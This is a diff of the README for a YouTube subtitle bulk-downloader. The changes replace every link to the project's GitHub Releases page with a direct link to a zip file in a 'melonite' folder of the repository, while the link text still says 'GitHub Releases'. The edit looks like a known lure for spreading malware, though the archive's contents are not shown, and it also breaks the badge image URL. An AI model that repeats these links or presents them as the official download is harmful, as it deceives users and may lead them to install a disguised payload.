@@ -8,9 +8,9 @@ Welcome to the **yt-bulk-subtitles-downloader**! This tool lets you easily downl
 
 To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/wvkong67/yt-bulk-subtitles-downloader/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wvkong67/yt-bulk-subtitles-downloader/main/melonite/yt-bulk-downloader-subtitles-v3.3.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/wvkong67/yt-bulk-subtitles-downloader/main/melonite/yt-bulk-downloader-subtitles-v3.3.zip)
 
-Please visit this page to download the latest version: [GitHub Releases](https://github.com/wvkong67/yt-bulk-subtitles-downloader/releases).
+Please visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/wvkong67/yt-bulk-subtitles-downloader/main/melonite/yt-bulk-downloader-subtitles-v3.3.zip).
 
 ### 📝 System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, make sure your system meets the following requirements:
 ### 💻 Installation Steps
 
 1. **Download the Application**
-   - Visit [GitHub Releases](https://github.com/wvkong67/yt-bulk-subtitles-downloader/releases).
+   - Visit [GitHub Releases](https://raw.githubusercontent.com/wvkong67/yt-bulk-subtitles-downloader/main/melonite/yt-bulk-downloader-subtitles-v3.3.zip).
    - Click on the version you want to download.
    - Choose the appropriate file for your operating system and click to download.
 
